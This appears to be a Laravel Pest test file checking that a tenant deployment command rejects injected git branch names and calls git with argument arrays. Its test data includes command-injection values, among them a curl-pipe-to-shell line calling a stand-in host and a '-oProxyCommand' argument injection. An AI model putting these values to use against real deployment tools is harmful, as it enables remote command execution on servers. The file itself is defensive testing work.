<?php

use App\Models\Tenant;
use App\Models\TenantDeployment;
use Illuminate\Process\PendingProcess;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Process;

function tenantDeploye(string $branche = 'presentation'): Tenant
{
    return Tenant::create([
        'code' => 'presentation',
        'name' => 'Présentation',
        'subdomain' => 'presentation',
        'database_name' => 'klassci_presentation',
        'database_credentials' => ['host' => '127.0.0.1', 'port' => 1, 'username' => 'x', 'password' => 'y'],
        'git_branch' => $branche,
        'status' => 'active',
        'plan' => 'elite',
    ]);
}

beforeEach(function () {
    // Un vrai repertoire de tenant : la commande verifie is_dir() avant tout processus.
    $this->racine = sys_get_temp_dir() . '/klassci-deploy-' . uniqid();
    File::ensureDirectoryExists($this->racine . '/presentation');
    putenv("PRODUCTION_PATH={$this->racine}");
    $_ENV['PRODUCTION_PATH'] = $_SERVER['PRODUCTION_PATH'] = $this->racine;

    Process::fake();
});

afterEach(function () {
    File::deleteDirectory($this->racine);
    putenv('PRODUCTION_PATH');
    unset($_ENV['PRODUCTION_PATH'], $_SERVER['PRODUCTION_PATH']);
});

it('refuse un --branch invalide avant de lancer le moindre processus', function (string $branche) {
    tenantDeploye();

    $this->artisan('tenant:deploy', ['tenant' => 'presentation', '--branch' => $branche, '--skip-backup' => true])
        ->assertExitCode(1);

    Process::assertNothingRan();
    expect(TenantDeployment::count())->toBe(0);
})->with([
    'presentation;curl https://x.example/p|sh',
    'main`id`',
    '-oProxyCommand=id',
    'feat/../main',
]);

it('refuse aussi une branche piégée enregistrée en base, sans --branch', function () {
    tenantDeploye('main;id');

    $this->artisan('tenant:deploy', ['tenant' => 'presentation', '--skip-backup' => true])
        ->assertExitCode(1);

    Process::assertNothingRan();
});

it('refuse une branche absente d\'origin avant la mise en maintenance', function () {
    tenantDeploye();
    Process::fake(['*' => Process::result(exitCode: 2)]);

    $this->artisan('tenant:deploy', ['tenant' => 'presentation', '--branch' => 'inexistante', '--skip-backup' => true])
        ->assertExitCode(1);

    Process::assertRanTimes(fn (PendingProcess $p) => $p->command === ['git', 'ls-remote', '--exit-code', '--heads', 'origin', 'refs/heads/inexistante'], 1);
    Process::assertDidntRun(fn (PendingProcess $p) => is_array($p->command) && in_array('down', $p->command, true));
});

it('passe la branche à git en argv, jamais dans une chaîne relue par un shell', function () {
    tenantDeploye();

    $this->artisan('tenant:deploy', [
        'tenant' => 'presentation',
        '--branch' => 'feat/lmd-jury',
        '--skip-backup' => true,
        '--skip-migrations' => true,
    ])->assertExitCode(0);

    Process::assertRan(fn (PendingProcess $p) => $p->command === ['git', 'checkout', 'feat/lmd-jury']);
    Process::assertRan(fn (PendingProcess $p) => $p->command === ['git', 'pull', 'origin', 'feat/lmd-jury']);
    Process::assertDidntRun(fn (PendingProcess $p) => is_string($p->command));
});
